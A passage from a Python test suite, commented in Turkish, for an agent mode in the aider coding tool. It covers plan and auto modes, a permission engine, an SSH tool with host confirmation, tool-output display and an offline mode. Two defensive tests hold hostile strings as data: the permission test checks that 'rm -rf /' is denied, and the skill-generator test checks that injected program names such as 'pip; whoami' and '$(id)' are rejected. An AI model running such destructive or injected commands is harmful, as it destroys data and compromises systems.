        self.assertIn("Hatirla", self._coder().registry.names())

    def test_hatirla_is_hidden_in_plan_mode(self):
        # Not yazmak yan etkilidir; plan modunda sunulmamalı.
        from aider.coders import Coder
        from aider.io import InputOutput
        from aider.models import Model

        coder = Coder.create(
            main_model=Model("gpt-4o"),
            edit_format="agent",
            io=InputOutput(yes=True, pretty=False, fancy_input=False),
            fnames=[],
            use_git=False,
            stream=False,
            plan_mode=True,
        )
        self.assertNotIn("Hatirla", coder.available_tools())

    def test_no_memory_no_instructions_is_fine(self):
        coder = self._coder()
        prompt = coder.fmt_system_prompt(coder.gpt_prompts.main_system)
        self.assertNotIn("# Bellek", prompt)
        self.assertNotIn("# Proje talimatları", prompt)


# ---------------------------------------------------------------------------
# Durum çubuğu ve shift+tab ile mod değiştirme
# ---------------------------------------------------------------------------


class TestStatusBarAndModeCycle(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.prev = os.getcwd()
        os.chdir(self.tmp.name)
        self.coder = self._coder()

    def tearDown(self):
        os.chdir(self.prev)
        self.tmp.cleanup()

    def _coder(self, **kw):
        from aider.coders import Coder
        from aider.io import InputOutput
        from aider.models import Model

        self.io = InputOutput(yes=True, pretty=False, fancy_input=False)
        return Coder.create(
            main_model=Model("gpt-4o"),
            edit_format="agent",
            io=self.io,
            fnames=[],
            use_git=False,
            stream=False,
            **kw,
        )

    def _plain(self):
        return self.coder._status_text()

    def test_hooks_are_installed_on_io(self):
        # Bunlar olmadan çubuk çizilmez ve shift+tab çalışmaz.
        self.assertTrue(callable(self.io.agent_status))
        self.assertTrue(callable(self.io.agent_cycle_mode))

    def test_other_coders_do_not_get_the_hooks(self):
        from aider.coders import Coder
        from aider.io import InputOutput
        from aider.models import Model

        io = InputOutput(yes=True, pretty=False, fancy_input=False)
        Coder.create(
            main_model=Model("gpt-4o"), edit_format="diff", io=io, fnames=[], use_git=False
        )
        self.assertIsNone(io.agent_status)
        self.assertIsNone(io.agent_cycle_mode)

    def test_prompt_message_is_callable_and_follows_mode(self):
        # shift+tab modu degistirdiginde ekranin ANINDA guncellenmesi icin
        # prompt mesaji sabit dizge degil cagrilabilir olmali. Sabit dizgeyle
        # invalidate() ayni metni yeniden ciziyor ve degisim bir sonraki
        # prompt'a kadar gorunmuyordu.
        from unittest.mock import MagicMock, patch

        io = self.io
        io.fancy_input = True
        io.prompt_session = MagicMock()
        io.prompt_session.prompt.return_value = ""

        with patch.object(io, "_get_style", return_value=None):
            io.get_input("/tmp", [], [], None, edit_format="agent")

        mesaj = io.prompt_session.prompt.call_args[0][0]
        self.assertTrue(callable(mesaj), "prompt mesaji cagrilabilir olmali")

        onceki = mesaj()
        self.assertIn(self.coder._status_text(), onceki)

        self.coder.cycle_mode()
        sonraki = mesaj()
        self.assertNotEqual(onceki, sonraki, "mod degisti ama mesaj ayni kaldi")
        self.assertIn(self.coder._status_text(), sonraki)

    def test_cycle_visits_every_mode_and_returns(self):
        gorulen = []
        for _ in range(len(self.coder.MODE_CYCLE)):
            gorulen.append(self.coder.current_mode())
            self.coder.cycle_mode()
        self.assertEqual(set(gorulen), set(self.coder.MODE_CYCLE))
        # Döngü başladığı yere dönmeli.
        self.assertEqual(self.coder.current_mode(), gorulen[0])

    def test_status_is_short_enough_for_a_prompt(self):
        # Prompt önekine giriyor; uzun olursa satırı boğar.
        for mode in self.coder.MODE_CYCLE:
            while self.coder.current_mode() != mode:
                self.coder.cycle_mode()
            self.assertLessEqual(len(self._plain()), 20, self._plain())

    def test_mode_help_lists_every_mode_and_marks_current(self):
        # shift+tab çalışmayan terminaller için /mod çıktısı yol gösterici olmalı.
        yardim = self.coder.mode_help()
        for mode in self.coder.MODE_CYCLE:
            self.assertIn(self.coder.MODE_LABELS[mode][1], yardim)
        self.assertIn("→", yardim)

    def test_status_shows_marker_and_name_of_current_mode(self):
        for mode in self.coder.MODE_CYCLE:
            while self.coder.current_mode() != mode:
                self.coder.cycle_mode()
            isaret, ad, _renk = self.coder.MODE_LABELS[mode]
            duz = self._plain()
            self.assertIn(isaret, duz)
            self.assertIn(ad, duz)

    def test_each_mode_has_a_distinct_marker(self):
        isaretler = [v[0] for v in self.coder.MODE_LABELS.values()]
        self.assertEqual(len(isaretler), len(set(isaretler)))

    def test_cycling_to_plan_hides_mutating_tools(self):
        while self.coder.current_mode() != "plan":
            self.coder.cycle_mode()
        araclar = self.coder.available_tools()
        for ad in ("Write", "Edit", "Bash", "Hatirla"):
            self.assertNotIn(ad, araclar)
        self.assertIn("ExitPlanMode", araclar)
        self.assertIn("Read", araclar)

    def test_cycling_out_of_plan_restores_mutating_tools(self):
        while self.coder.current_mode() != "plan":
            self.coder.cycle_mode()
        self.coder.cycle_mode()
        araclar = self.coder.available_tools()
        self.assertIn("Write", araclar)
        self.assertIn("Bash", araclar)
        self.assertNotIn("ExitPlanMode", araclar)

    def test_cycle_updates_the_permission_engine(self):
        while self.coder.current_mode() != "auto":
            self.coder.cycle_mode()
        self.assertEqual(self.coder.ctx.permissions.mode, "auto")
        self.assertEqual(
            self.coder.ctx.permissions.decide("Bash", {"command": "echo hi"}, True), ALLOW
        )

    def test_auto_mode_still_denies_dangerous_commands(self):
        # Mod değiştirmek yerleşik güvenlik listesini devre dışı bırakmamalı.
        while self.coder.current_mode() != "auto":
            self.coder.cycle_mode()
        self.assertEqual(
            self.coder.ctx.permissions.decide("Bash", {"command": "rm -rf /"}, True), DENY
        )

    def test_plan_flag_starts_in_plan_mode(self):
        self.coder = self._coder(plan_mode=True)
        self.assertEqual(self.coder.current_mode(), "plan")

    def test_status_text_is_plain_string(self):
        # Prompt öneki aider'in kendi stiliyle çiziliyor; araya renk kodu
        # sokmak satırı bozuyor.
        self.assertIsInstance(self.coder._status_text(), str)

    def test_marker_falls_back_to_ascii_on_limited_encoding(self):
        mode = self.coder.current_mode()
        isaret = self.coder.MODE_LABELS[mode][0]
        with patch("sys.stdout") as sahte:
            sahte.encoding = "ascii"
            self.assertEqual(self.coder._marker(mode, isaret), self.coder.ASCII_MARKERS[mode])

    def test_marker_uses_glyph_when_encoding_allows(self):
        mode = self.coder.current_mode()
        isaret = self.coder.MODE_LABELS[mode][0]
        with patch("sys.stdout") as sahte:
            sahte.encoding = "utf-8"
            self.assertEqual(self.coder._marker(mode, isaret), isaret)


# ---------------------------------------------------------------------------
# Ssh aracı
# ---------------------------------------------------------------------------

from aider.agent.ssh_tool import SshTool, known_hosts  # noqa: E402


class TestKnownHosts(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.cfg = Path(self.tmp.name) / "config"

    def tearDown(self):
        self.tmp.cleanup()

    def test_reads_host_aliases(self):
        self.cfg.write_text("Host skyup\n  HostName 1.2.3.4\nHost web01\n", encoding="utf-8")
        self.assertEqual(known_hosts(self.cfg), ["skyup", "web01"])

    def test_wildcard_entries_are_skipped(self):
        # 'Host *' bağlanılacak bir sunucu değil, diğerlerine uygulanan varsayılan.
        self.cfg.write_text("Host *\n  User root\nHost skyup\n", encoding="utf-8")
        self.assertEqual(known_hosts(self.cfg), ["skyup"])

    def test_multiple_aliases_on_one_line(self):
        self.cfg.write_text("Host web01 web02\n", encoding="utf-8")
        self.assertEqual(known_hosts(self.cfg), ["web01", "web02"])

    def test_missing_file_is_not_an_error(self):
        self.assertEqual(known_hosts(Path(self.tmp.name) / "yok"), [])

    def test_case_insensitive_keyword(self):
        self.cfg.write_text("host skyup\n", encoding="utf-8")
        self.assertEqual(known_hosts(self.cfg), ["skyup"])


class TestSshTool(unittest.TestCase):
    """Aracın asıl işi sunucu adı uydurmayı engellemek."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)
        self.ctx = make_ctx(self.root)
        self.tool = SshTool()
        self.patcher = patch("aider.agent.ssh_tool.known_hosts", return_value=["skyup", "fedora"])
        self.patcher.start()
        self.addCleanup(self.patcher.stop)
        # Gerçek ~/.ssh/known_hosts okunmasın: testin sonucu makinede hangi
        # sunuculara bağlanılmış olduğuna bağlı olamaz.
        self.kh = patch("aider.agent.ssh_tool.known_hosts_dosyasi", return_value=[])
        self.kh.start()
        self.addCleanup(self.kh.stop)

    def tearDown(self):
        self.tmp.cleanup()

    def test_user_at_host_is_rejected(self):
        # Gözlenen hata: kullanıcı 'skyup' dedi, model 'skyup@kurum.local' üretti.
        with self.assertRaises(ToolError) as cm:
            self.tool.run(self.ctx, host="skyup@kurum.local", command="df -h")
        self.assertIn("olduğu gibi kullan", str(cm.exception))

    def test_rejection_suggests_the_right_alias(self):
        with self.assertRaises(ToolError) as cm:
            self.tool.run(self.ctx, host="root@skyup.kurum.local", command="df -h")
        self.assertIn("skyup", str(cm.exception))

    def test_domain_suffix_is_rejected(self):
        with self.assertRaises(ToolError):
            self.tool.run(self.ctx, host="skyup.kurum.local", command="df -h")

    def test_bilinen_fqdn_reddedilmez(self):
        # known_hosts sıklıkla FQDN tutuyor; bilinen bir ada alan adı eklenmiş
        # muamelesi yapmak yanlış olur.
        with patch("aider.agent.ssh_tool.known_hosts_dosyasi", return_value=["srv.kurum.local"]):
            with patch("subprocess.run") as sahte:
                sahte.return_value = MagicMock(returncode=0, stdout="ok", stderr="")
                self.tool.run(self.ctx, host="srv.kurum.local", command="uptime")
            sahte.assert_called_once()

    def test_bilinmeyen_ad_reddedilmez_sorulur(self):
        """Bilinmeyen ad artık tümden reddedilmiyor.

        srvsatellite gibi public-key ile çalışan ve DNS'te çözülen bir sunucu
        hiçbir yapılandırma dosyasında görünmeyebilir; eski davranış bu tür
        sunucuları tümden engelliyordu.
        """
        with patch("subprocess.run") as sahte:
            sahte.return_value = MagicMock(returncode=0, stdout="ok", stderr="")
            self.tool.run(self.ctx, host="srvsatellite", command="hammer ping")
        sahte.assert_called_once()
        sorular = [c.args[0] for c in self.ctx.io.confirm_ask.call_args_list if c.args]
        self.assertTrue(any("bilinen sunucular arasında yok" in s for s in sorular), sorular)

    def test_bilinmeyen_ad_onaylanmazsa_baglanmaz(self):
        ctx = make_ctx(self.root)
        ctx.permissions = None
        # Önce komut onayı sorulur (evet), sonra sunucu onayı (hayır).
        ctx.io.confirm_ask.side_effect = [True, False]
        with patch("subprocess.run") as sahte:
            out = self.tool.run(ctx, host="yokboyle", command="df -h")
        sahte.assert_not_called()
        self.assertIn("skyup", out)
        self.assertIn("fedora", out)
        self.assertNotIn("yokboyle", ctx.onaylanan_sunucular)

    def test_onaylanan_ad_ikinci_kez_sorulmaz(self):
        with patch("subprocess.run") as sahte:
            sahte.return_value = MagicMock(returncode=0, stdout="ok", stderr="")
            self.tool.run(self.ctx, host="srvsatellite", command="uptime")
            ilk = self.ctx.io.confirm_ask.call_count
            self.tool.run(self.ctx, host="srvsatellite", command="df -h")
            ikinci = self.ctx.io.confirm_ask.call_count
        # İkinci çağrıda yalnızca komut onayı sorulmalı, sunucu onayı değil.
        self.assertEqual(ikinci - ilk, 1)
        self.assertIn("srvsatellite", self.ctx.onaylanan_sunucular)

    def test_envanterdeki_host_bilinen_sayilir(self):
        (self.root / "hosts-uretim.ini").write_text(
            "[web]\nweb01 ansible_host=10.0.0.11\n\n[web:vars]\nansible_user=root\n"
        )
        with patch("subprocess.run") as sahte:
            sahte.return_value = MagicMock(returncode=0, stdout="ok", stderr="")
            self.tool.run(self.ctx, host="web01", command="uptime")
        sorular = [c.args[0] for c in self.ctx.io.confirm_ask.call_args_list if c.args]
        self.assertFalse(any("bilinen sunucular arasında yok" in s for s in sorular), sorular)

    def test_envanter_degiskeni_host_sanilmaz(self):
        from aider.agent.ssh_tool import envanter_hostlari

        (self.root / "hosts.ini").write_text("[web]\nweb01\n\n[web:vars]\nansible_user=root\n")
        adlar = envanter_hostlari(self.root)
        self.assertIn("web01", adlar)
        self.assertNotIn("ansible_user=root", adlar)

    def test_yaml_envanteri_okunur(self):
        from aider.agent.ssh_tool import envanter_hostlari

        (self.root / "hosts.yml").write_text(
            "all:\n  children:\n    web:\n      hosts:\n        web02:\n"
            "          ansible_host: 10.0.0.12\n"
        )
        self.assertIn("web02", envanter_hostlari(self.root))

    def test_empty_host_rejected(self):
        with self.assertRaises(ToolError):
            self.tool.run(self.ctx, host="", command="df -h")

    def test_empty_command_rejected(self):
        with self.assertRaises(ToolError):
            self.tool.run(self.ctx, host="skyup", command="")

    def test_declined_confirmation_does_not_connect(self):
        ctx = make_ctx(self.root, confirm=False)
        ctx.permissions = None
        with patch("subprocess.run") as sahte:
            out = self.tool.run(ctx, host="skyup", command="df -h")
        sahte.assert_not_called()
        self.assertIn("reddetti", out)

    def test_valid_alias_gets_timeout_and_batchmode(self):
        with patch("subprocess.run") as sahte:
            sahte.return_value = MagicMock(returncode=0, stdout="ok", stderr="")
            self.tool.run(self.ctx, host="skyup", command="df -h")
        argv = sahte.call_args[0][0]
        self.assertIn("ConnectTimeout=5", argv)
        self.assertIn("BatchMode=yes", argv)
        self.assertEqual(argv[-2:], ["skyup", "df -h"])

    def test_connection_failure_is_reported_clearly(self):
        with patch("subprocess.run") as sahte:
            sahte.return_value = MagicMock(
                returncode=255, stdout="", stderr="Could not resolve hostname"
            )
            out = self.tool.run(self.ctx, host="skyup", command="df -h")
        self.assertIn("bağlanılamadı", out)

    def test_remote_nonzero_exit_is_surfaced(self):
        with patch("subprocess.run") as sahte:
            sahte.return_value = MagicMock(returncode=2, stdout="", stderr="no such file")
            out = self.tool.run(self.ctx, host="skyup", command="cat yok")
        self.assertIn("çıkış kodu 2", out)

    def test_timeout_is_capped(self):
        with patch("subprocess.run") as sahte:
            sahte.return_value = MagicMock(returncode=0, stdout="ok", stderr="")
            self.tool.run(self.ctx, host="skyup", command="ls", timeout=99999)
        self.assertLessEqual(sahte.call_args[1]["timeout"], 600)

    def test_tool_is_registered_in_agent_coder(self):
        from aider.coders import Coder
        from aider.io import InputOutput
        from aider.models import Model

        with tempfile.TemporaryDirectory() as tmp:
            prev = os.getcwd()
            os.chdir(tmp)
            try:
                coder = Coder.create(
                    main_model=Model("gpt-4o"),
                    edit_format="agent",
                    io=InputOutput(yes=True, pretty=False, fancy_input=False),
                    fnames=[],
                    use_git=False,
                )
                self.assertIn("Ssh", coder.registry.names())
                # Yan etkili sayılmalı: plan modunda sunulmamalı.
                self.assertTrue(coder.registry.get("Ssh").mutating)
            finally:
                os.chdir(prev)


class TestToolResultVisibility(unittest.TestCase):
    """Araç çıktısı kullanıcıya görünmeli.

    Görünmediğinde, model zayıf olup sonucu özetlemediğinde ekranda yalnızca
    çağrı satırı kalıyordu: komut çalışıyor, veri geliyor, kullanıcı hiçbir
    şey görmüyor.
    """

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.prev = os.getcwd()
        os.chdir(self.tmp.name)

        from aider.coders import Coder
        from aider.io import InputOutput
        from aider.models import Model

        self.io = InputOutput(yes=True, pretty=False, fancy_input=False)
        self.coder = Coder.create(
            main_model=Model("gpt-4o"),
            edit_format="agent",
            io=self.io,
            fnames=[],
            use_git=False,
            stream=False,
        )

    def tearDown(self):
        os.chdir(self.prev)
        self.tmp.cleanup()

    def _basilan(self, name, result):
        with (
            patch.object(self.io, "tool_output") as cikti,
            patch.object(self.io, "tool_error") as hata,
        ):
            self.coder._show_tool_result(name, result)
        return (
            [c.args[0] for c in cikti.call_args_list if c.args],
            [c.args[0] for c in hata.call_args_list if c.args],
        )

    def test_short_output_is_shown_in_full(self):
        cikti, _ = self._basilan("Bash", "bir\niki\nüç")
        self.assertEqual(len(cikti), 3)
        self.assertIn("iki", cikti[1])

    def test_long_output_is_truncated_with_a_count(self):
        from aider.coders.agent_coder import RESULT_PREVIEW_LINES

        cikti, _ = self._basilan("Bash", "\n".join(str(i) for i in range(40)))
        self.assertEqual(len(cikti), RESULT_PREVIEW_LINES + 1)
        self.assertIn("satır daha", cikti[-1])

    def test_dosya_okumada_yalnizca_ozet_satiri(self):
        """Read'in ilk satırı zaten "dosya (satır 1-40, toplam 120)" özeti.

        İçeriği ekrana dökmenin bilgi değeri yok: model tamamını görüyor,
        kullanıcı ekranı doluyor.
        """
        icerik = "dosya.py (satır 1-40, toplam 120)\n" + "\n".join(str(i) for i in range(40))
        cikti, _ = self._basilan("Read", icerik)
        self.assertEqual(len(cikti), 2)
        self.assertIn("dosya.py", cikti[0])
        self.assertIn("40 satır daha", cikti[1])

    def test_beceri_govdesi_ekrana_dokulmez(self):
        # Skill aracı zaten "Beceri yüklendi: X" yazıyor; gövde ekrana girmesin.
        cikti, hata = self._basilan("Skill", "# Beceri: ansible\n\nuzun gövde\n" * 20)
        self.assertEqual(cikti, [])
        self.assertEqual(hata, [])

    def test_kirpma_toplami_bildirir(self):
        cikti, _ = self._basilan("Bash", "\n".join(str(i) for i in range(40)))
        self.assertIn("toplam 40", cikti[-1])

    def test_errors_go_to_the_error_channel(self):
        cikti, hata = self._basilan("Ssh", "Hata: host zorunlu")
        self.assertEqual(cikti, [])
        self.assertEqual(len(hata), 1)
        self.assertIn("host zorunlu", hata[0])

    def test_self_printing_tools_are_not_duplicated(self):
        # TodoWrite kendi listesini zaten basıyor.
        cikti, hata = self._basilan("TodoWrite", "Görev listesi güncellendi (1/2)")
        self.assertEqual(cikti, [])
        self.assertEqual(hata, [])

    def test_empty_result_prints_nothing(self):
        cikti, hata = self._basilan("Bash", "   \n  ")
        self.assertEqual(cikti, [])
        self.assertEqual(hata, [])


class TestEmptyModelReply(unittest.TestCase):
    """Model ne araç çağırıp ne bir şey söylediğinde kullanıcı uyarılmalı."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.prev = os.getcwd()
        os.chdir(self.tmp.name)

    def tearDown(self):
        os.chdir(self.prev)
        self.tmp.cleanup()

    def _coder(self, responses):
        from aider.coders import Coder
        from aider.io import InputOutput
        from aider.models import Model

        self.io = InputOutput(yes=True, pretty=False, fancy_input=False)
        coder = Coder.create(
            main_model=Model("gpt-4o"),
            edit_format="agent",
            io=self.io,
            fnames=[],
            use_git=False,
            stream=False,
        )
        coder.auto_lint = coder.auto_test = False
        sayac = {"n": 0}

        def sahte(messages, functions, stream, temperature=None):
            i = sayac["n"]
            sayac["n"] += 1
            return MagicMock(), FakeCompletion(responses[i])

        coder.main_model.send_completion = sahte
        return coder

    def test_empty_reply_with_no_tools_warns_clearly(self):
        # Boş yanıtta bir kez dürtülür; ikinci kez de boşsa uyarı basılır.
        coder = self._coder([FakeMessage(content=""), FakeMessage(content="")])
        with patch.object(self.io, "tool_warning") as uyari:
            list(coder.send_message("bir şey yap"))
        metinler = [c[0][0] for c in uyari.call_args_list]
        self.assertTrue(any("bir kez daha deneniyor" in m for m in metinler), metinler)
        self.assertIn("hiç araç çağırmadı", metinler[-1])

    def test_nudge_recovers_from_empty_reply(self):
        # Asıl kazanç bu: zayıf model ilk turda boş dönüyor, dürtülünce
        # devam ediyor. Eskiden döngü ilk boşlukta pes edip işi yarıda
        # bırakıyordu.
        coder = self._coder([FakeMessage(content=""), FakeMessage(content="Bitti: 19 paket")])
        with patch.object(self.io, "tool_warning") as uyari:
            list(coder.send_message("bir şey yap"))
        metinler = [c[0][0] for c in uyari.call_args_list]
        self.assertTrue(any("bir kez daha deneniyor" in m for m in metinler), metinler)
        self.assertFalse(any("hiç araç çağırmadı" in m for m in metinler), metinler)
        self.assertIn("Bitti: 19 paket", coder.partial_response_content)

    def test_nudge_happens_only_once(self):
        # Boş-dürtme-boş-dürtme döngüsüne dönmemeli.
        coder = self._coder([FakeMessage(content="")] * 4)
        with patch.object(self.io, "tool_warning") as uyari:
            list(coder.send_message("bir şey yap"))
        metinler = [c[0][0] for c in uyari.call_args_list]
        self.assertEqual(sum("bir kez daha deneniyor" in m for m in metinler), 1, metinler)

    def test_empty_reply_after_tool_use_says_it_was_not_summarised(self):
        # Araç çalıştıysa "hiçbir şey yapmadı" demek yanlış olur; iş yapıldı,
        # yalnızca özetlenmedi.
        coder = self._coder(
            [
                FakeMessage(tool_calls=[FakeToolCall("c1", "Glob", json.dumps({"pattern": "*"}))]),
                FakeMessage(content=""),
                FakeMessage(content=""),  # dürtmeden sonra da boş
            ]
        )
        with patch.object(self.io, "tool_warning") as uyari:
            list(coder.send_message("dosyaları listele"))
        mesajlar = [c.args[0] for c in uyari.call_args_list if c.args]
        self.assertTrue(any("özetlemedi" in m for m in mesajlar), mesajlar)
        self.assertFalse(any("hiç araç çağırmadı" in m for m in mesajlar), mesajlar)

    def test_whitespace_only_reply_also_warns(self):
        coder = self._coder([FakeMessage(content="   \n  "), FakeMessage(content="  ")])
        with patch.object(self.io, "tool_warning") as uyari:
            list(coder.send_message("bir şey yap"))
        self.assertTrue(uyari.called)

    def test_normal_reply_does_not_warn(self):
        coder = self._coder([FakeMessage(content="İşte cevabım.")])
        with patch.object(self.io, "tool_warning") as uyari:
            list(coder.send_message("bir şey yap"))
        mesajlar = [c.args[0] for c in uyari.call_args_list if c.args]
        self.assertFalse(any("boş yanıt" in m for m in mesajlar))


class TestBeceriUret(unittest.TestCase):
    """`--help` çıktısından beceri üretimi.

    Gerçek program çalıştırılmıyor: `calistir` yerine sahte bir çağrılabilir
    veriliyor, böylece testler makinede hangi araçların kurulu olduğuna
    bağlı kalmıyor.
    """

    PIP_YARDIM = """
Usage:
  pip <command> [options]

Commands:
  install                     Install packages.
  uninstall                   Uninstall packages.
  freeze                      Output installed packages.

General Options:
  -h, --help                  Show help.
  -v, --verbose               Give more output.
"""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)

    def tearDown(self):
        self.tmp.cleanup()

    def _calistirici(self, yardim=None, surum="arac 1.2.3", host=None):
        yardim = self.PIP_YARDIM if yardim is None else yardim

        class Sahte:
            nerede = host or "yerel makine"

            def var_mi(self, program):
                return True

            def __call__(self, argv):
                if argv[-1] in ("--version", "-V", "version"):
                    return 0, surum + "\n"
                if argv[-1] in ("--help", "-h", "help"):
                    if len(argv) == 2:
                        return 0, yardim
                    return 0, f"{argv[1]} {argv[-2]} kullanımı: uzun bir yardım metni.\n"
                return 1, ""

        return Sahte()

    # --- ayrıştırma ---------------------------------------------------------

    def test_alt_komutlar_baslik_altindan_toplanir(self):
        adlar = beceri_uret.alt_komutlari_ayikla(self.PIP_YARDIM)
        self.assertEqual(adlar, ["install", "uninstall", "freeze"])

    def test_secenekler_alt_komut_sayilmaz(self):
        adlar = beceri_uret.alt_komutlari_ayikla(self.PIP_YARDIM)
        for istenmeyen in ("h", "help", "v", "verbose"):
            self.assertNotIn(istenmeyen, adlar)

    def test_girintisiz_grup_basligi_listeyi_bitirmez(self):
        # git komutlarını girintisiz grup başlıkları altında listeliyor; her
        # girintisiz satırda durmak listeyi tamamen kaçırıyordu.
        metin = (
            "These are common Git commands used in various situations:\n"
            "\n"
            "start a working area (see also: git help tutorial)\n"
            "   clone      Clone a repository\n"
            "\n"
            "grow, mark and tweak your history\n"
            "   commit     Record changes\n"
        )
        self.assertEqual(beceri_uret.alt_komutlari_ayikla(metin), ["clone", "commit"])

    def test_argparse_kumesi_ayiklanir(self):
        metin = "positional arguments:\n  {list,show,add}\n"
        self.assertEqual(beceri_uret.alt_komutlari_ayikla(metin), ["list", "show", "add"])

    def test_alt_komut_sayisi_sinirli(self):
        satirlar = "Commands:\n" + "".join(f"  komut{i}   açıklama\n" for i in range(60))
        self.assertEqual(len(beceri_uret.alt_komutlari_ayikla(satirlar)), 25)

    # --- sürüm --------------------------------------------------------------

    def test_surum_hata_ciktisini_surum_sanmaz(self):
        # Ölçülen gerçek davranış: `git -V` "unknown option: -V" deyip uzun bir
        # kullanım metni basıyor. Uzunluğa bakan eski ölçüt bunu sürüm sanıyordu.
        def calistir(argv):
            if argv[-1] == "--version":
                return 0, "git version 2.50.1\n"
            if argv[-1] == "-V":
                return 129, "unknown option: -V\n" + "usage: git ...\n" * 20
            return 1, ""

        self.assertEqual(beceri_uret._surum_bul(calistir, "git"), "git version 2.50.1")

    def test_basarisiz_surum_komutu_yok_sayilir(self):
        def calistir(argv):
            return 1, "bilinmeyen seçenek\n" * 10

        self.assertIsNone(beceri_uret._surum_bul(calistir, "arac"))

    # --- üretim -------------------------------------------------------------

    def test_referans_ve_iskelet_yazilir(self):
        ad, bulgu, yazilan = beceri_uret.uret(self.root, "pip", calistir=self._calistirici())
        self.assertEqual(ad, "pip")
        self.assertEqual([a for a, _ in bulgu["alt"]], ["install", "uninstall", "freeze"])

        referans = self.root / "aider-skills" / "pip" / "referans" / "yardim.md"
        skill_md = self.root / "aider-skills" / "pip" / "SKILL.md"
        self.assertTrue(referans.is_file())
        self.assertTrue(skill_md.is_file())
        self.assertEqual(sorted(y.name for y in yazilan), ["SKILL.md", "yardim.md"])

        # Referans ham çıktının kendisi olmalı, özeti değil.
        self.assertIn("Install packages.", referans.read_text(encoding="utf-8"))

    def test_uretilen_iskelet_beceri_olarak_bulunur(self):
        beceri_uret.uret(self.root, "pip", calistir=self._calistirici())
        lib = SkillLibrary([self.root / "aider-skills"])
        self.assertIn("pip", lib.skills)
        # İskelet referans dosyasını göstermeli; model komutu oradan okuyacak.
        self.assertIn("referans/yardim.md", lib.skills["pip"].body)

    def test_var_olan_beceri_ezilmez(self):
        skill_md = self.root / "aider-skills" / "pip" / "SKILL.md"
        skill_md.parent.mkdir(parents=True)
        skill_md.write_text("---\nname: pip\ndescription: elle yazıldı\n---\n\nEMEK\n")

        _ad, _bulgu, yazilan = beceri_uret.uret(self.root, "pip", calistir=self._calistirici())
        self.assertIn("EMEK", skill_md.read_text(encoding="utf-8"))
        self.assertEqual([y.name for y in yazilan], ["yardim.md"])

    def test_beceri_adi_verilebilir(self):
        ad, _bulgu, _yazilan = beceri_uret.uret(
            self.root, "pip", ad="paket-yonetimi", calistir=self._calistirici()
        )
        self.assertEqual(ad, "paket-yonetimi")
        self.assertTrue((self.root / "aider-skills" / "paket-yonetimi" / "SKILL.md").is_file())

    def test_kabuk_karakterli_program_adi_reddedilir(self):
        # Uzak sunucuda komut satırı dizge olarak kuruluyor; ad doğrulaması
        # enjeksiyona karşı ilk savunma.
        for kotu in ("rm -rf /", "pip; whoami", "../bin/pip", "$(id)"):
            with self.assertRaises(beceri_uret.UretimHatasi):
                beceri_uret.uret(self.root, kotu, calistir=self._calistirici())

    def test_olmayan_program_hata_verir(self):
        class Sahte:
            nerede = "sunucu"

            def var_mi(self, program):
                return False

            def __call__(self, argv):
                return 127, "command not found"

        with self.assertRaises(beceri_uret.UretimHatasi):
            beceri_uret.uret(self.root, "hammer", calistir=Sahte())

    def test_yardim_vermeyen_program_hata_verir(self):
        class Sahte:
            nerede = "yerel makine"

            def var_mi(self, program):
                return True

            def __call__(self, argv):
                return 1, "kısa"

        with self.assertRaises(beceri_uret.UretimHatasi):
            beceri_uret.uret(self.root, "arac", calistir=Sahte())

    def test_referans_butcesi_asilmaz(self):
        uzun = "Commands:\n" + "".join(f"  komut{i}   açıklama\n" for i in range(25))

        class Sahte:
            nerede = "yerel makine"

            def var_mi(self, program):
                return True

            def __call__(self, argv):
                if argv[-1] == "--version":
                    return 0, "arac 1.0\n"
                if argv[-1] == "--help":
                    if len(argv) == 2:
                        return 0, uzun
                    return 0, "x" * 50_000
                return 1, ""

        _ad, bulgu, _y = beceri_uret.uret(self.root, "arac", calistir=Sahte())

        self.assertTrue(bulgu["atlanan"], "bütçe dolunca kalan alt komutlar atlanmalı")
        toplam = len(bulgu["kok"]) + sum(len(m) for _a, m in bulgu["alt"])
        self.assertLess(toplam, beceri_uret.TOPLAM_REFERANS_BUTCESI * 1.2)
        for _ad2, metin in bulgu["alt"]:
            self.assertIn("kırpıldı", metin)


class TestCevrimdisiMod(unittest.TestCase):
    """Hava boşluklu kurum sunucusu için ağ davranışlarının kapatılması.

    Ölçülen sorun: --check-update varsayılan açık ve altındaki requests.get'in
    zaman aşımı yok; ağ yoksa açılış işletim sisteminin TCP zaman aşımı kadar
    bekliyor. Analitik ise açılışta etkinleşip dışarı olay gönderiyor.
    """

    def test_offline_ag_davranislarini_kapatir(self):
        from aider.args import get_parser
        from aider.main import cevrimdisi_uygula

        args = cevrimdisi_uygula(get_parser([], None).parse_args(["--offline"]))
        self.assertFalse(args.check_update)
        self.assertFalse(args.just_check_update)
        self.assertFalse(args.analytics)
        self.assertFalse(args.detect_urls)

    def test_offline_litellm_fiyat_listesini_indirtmez(self):
        """litellm import edilirken model fiyat listesini GitHub'dan çekiyor.

        Ölçüldü (hava boşluklu srvsatellite): açılışta
        "Failed to fetch remote model_prices_and_context_window.json" ve
        ardı ardına ConnectionResetError satırları.
        """
        import os

        from aider.args import get_parser
        from aider.main import cevrimdisi_uygula

        onceki = os.environ.pop("LITELLM_LOCAL_MODEL_COST_MAP", None)
        try:
            cevrimdisi_uygula(get_parser([], None).parse_args(["--offline"]))
            self.assertEqual(os.environ.get("LITELLM_LOCAL_MODEL_COST_MAP"), "True")
        finally:
            if onceki is None:
                os.environ.pop("LITELLM_LOCAL_MODEL_COST_MAP", None)
            else:
                os.environ["LITELLM_LOCAL_MODEL_COST_MAP"] = onceki

    def test_offline_model_bilgisi_agdan_cekilmez(self):
        """Asıl maliyet burada.

        _update_cache başarısız olunca content None kalıyor ve
        get_model_from_cached_json_db content boşsa HER çağrıda yeniden
        deniyor; her deneme 5 saniyelik bir ağ zaman aşımı.
        """
        from aider import models
        from aider.args import get_parser
        from aider.main import cevrimdisi_uygula

        yonetici = models.model_info_manager
        onceki = yonetici.offline
        try:
            cevrimdisi_uygula(get_parser([], None).parse_args(["--offline"]))
            self.assertTrue(yonetici.offline)
            with patch("requests.get") as sahte:
                yonetici.content = None
                yonetici._cache_loaded = True
                for _ in range(3):
